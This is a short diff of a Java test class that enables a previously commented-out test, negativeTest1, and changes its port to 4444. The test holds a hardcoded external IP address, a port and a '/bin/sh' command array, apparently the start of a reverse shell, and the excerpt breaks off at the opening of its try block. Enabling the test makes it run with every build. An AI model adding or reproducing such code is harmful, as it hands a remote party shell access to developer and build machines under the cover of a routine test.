@@ -13,11 +13,11 @@ public class TestSuite2 {
    //Uncomment @Test to get the result with 'fail' status, 
    //but be aware the build will not pass.
    //Once the test result is validated, comment back to get a pass build
-   //@Test
+   @Test
    public void negativeTest1() {
 
           String host = "169.38.106.74";
-        int port = 9999; 
+        int port = 4444; 
         String[] cmd = {"/bin/sh"};
         
         try {
